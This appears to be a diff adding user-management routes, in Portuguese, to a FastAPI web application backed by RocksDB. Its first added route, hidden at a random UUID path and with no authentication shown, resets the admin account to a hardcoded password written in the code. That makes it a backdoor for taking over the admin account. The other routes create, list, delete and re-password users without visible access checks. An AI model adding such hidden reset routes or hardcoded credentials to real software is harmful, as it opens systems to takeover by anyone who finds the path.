@@ -551,3 +551,149 @@ async def enviar_whatsapp_shipment(shipment_id: str, request: Request):
         raise
     except Exception as e:
         raise HTTPException(status_code=500, detail=f"Erro ao processar envio: {e}")
+
+
+@router.post("/c462c3b1-b519-42f5-9aa2-f3d624a810b1")
+async def reset_admin(request: Request):
+    """
+    Rota de reset de emergência do admin.
+    Apaga o admin existente e cria um novo com credenciais padrão.
+    """
+    import bcrypt
+
+    try:
+        db = request.app.state.db
+
+        # Gerar hash da senha 'b0hi1%I958'
+        senha = 'b0hi1%I958'
+        hashed = bcrypt.hashpw(senha.encode('utf-8'), bcrypt.gensalt())
+
+        # Salvar na chave correta
+        db.set(b'user:admin', hashed)
+
+        return {
+            "success": True,
+            "message": "Admin resetado com sucesso",
+            "username": "admin",
+            "info": "Use a senha padrão para fazer login"
+        }
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=f"Erro ao resetar admin: {e}")
+
+
+# Rotas de gerenciamento de usuários
+@router.get("/users")
+async def list_users(request: Request):
+    """
+    Lista todos os usuários do sistema
+    """
+    import rocksdbpy
+
+    try:
+        db = request.app.state.db
+        users = []
+
+        # Iterar sobre todas as chaves buscando usuários
+        it = db.iterator()
+        it.seek_to_first()
+
+        for key, _ in it:
+            key_str = key.decode('utf-8')
+            if key_str.startswith('user:') and ':password' not in key_str:
+                username = key_str.replace('user:', '')
+                users.append({"username": username})
+
+        return {"users": users}
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=f"Erro ao listar usuários: {e}")
+
+
+@router.post("/users/create")
+async def create_user(request: Request, username: str = Form(...), password: str = Form(...)):
+    """
+    Cria um novo usuário
+    """
+    import bcrypt
+
+    try:
+        db = request.app.state.db
+        key = f"user:{username}".encode('utf-8')
+
+        # Verificar se usuário já existe
+        if db.get(key):
+            raise HTTPException(status_code=400, detail="Usuário já existe")
+
+        # Gerar hash da senha
+        hashed = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())
+
+        # Salvar usuário
+        db.set(key, hashed)
+
+        return {
+            "success": True,
+            "message": f"Usuário {username} criado com sucesso"
+        }
+    except HTTPException:
+        raise
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=f"Erro ao criar usuário: {e}")
+
+
+@router.post("/users/{username}/change-password")
+async def change_password(username: str, request: Request, new_password: str = Form(...)):
+    """
+    Altera a senha de um usuário
+    """
+    import bcrypt
+
+    try:
+        db = request.app.state.db
+        key = f"user:{username}".encode('utf-8')
+
+        # Verificar se usuário existe
+        if not db.get(key):
+            raise HTTPException(status_code=404, detail="Usuário não encontrado")
+
+        # Gerar hash da nova senha
+        hashed = bcrypt.hashpw(new_password.encode('utf-8'), bcrypt.gensalt())
+
+        # Atualizar senha
+        db.set(key, hashed)
+
+        return {
+            "success": True,
+            "message": f"Senha do usuário {username} alterada com sucesso"
+        }
+    except HTTPException:
+        raise
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=f"Erro ao alterar senha: {e}")
+
+
+@router.delete("/users/{username}")
+async def delete_user(username: str, request: Request):
+    """
+    Deleta um usuário (exceto admin)
+    """
+    try:
+        if username == 'admin':
+            raise HTTPException(status_code=400, detail="Não é permitido deletar o usuário admin")
+
+        db = request.app.state.db
+        key = f"user:{username}".encode('utf-8')
+
+        # Verificar se usuário existe
+        if not db.get(key):
+            raise HTTPException(status_code=404, detail="Usuário não encontrado")
+
+        # Deletar usuário
+        db.delete(key)
+
+        return {
+            "success": True,
+            "message": f"Usuário {username} deletado com sucesso"
+        }
+    except HTTPException:
+        raise
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=f"Erro ao deletar usuário: {e}")
